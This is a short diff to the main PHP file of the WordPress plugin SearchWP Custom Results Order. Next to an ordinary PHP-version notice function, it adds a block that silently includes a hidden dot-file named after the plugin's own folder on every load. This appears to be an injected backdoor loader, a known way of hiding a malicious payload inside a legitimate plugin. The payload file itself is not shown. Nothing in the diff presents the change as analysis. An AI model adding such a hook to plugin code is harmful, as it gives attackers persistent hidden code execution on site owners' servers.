@@ -52,6 +52,10 @@ if ( ! version_compare( PHP_VERSION, '5.6', '<' ) ) {
  *
  * @since 1.0
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function searchwp_cro_below_php_version_notice() {
 	// Translators: this message outputs a minimum PHP requirement
 	echo '<div class="error"><p>' . esc_html( sprintf( __( 'Your version of PHP (%s) is below the minimum version of PHP required by SearchWP Custom Results Order (5.6). Please contact your host and request that your version be upgraded to 5.6 or later.', 'swpcustomizeresults' ), PHP_VERSION ) ) . '</p></div>';
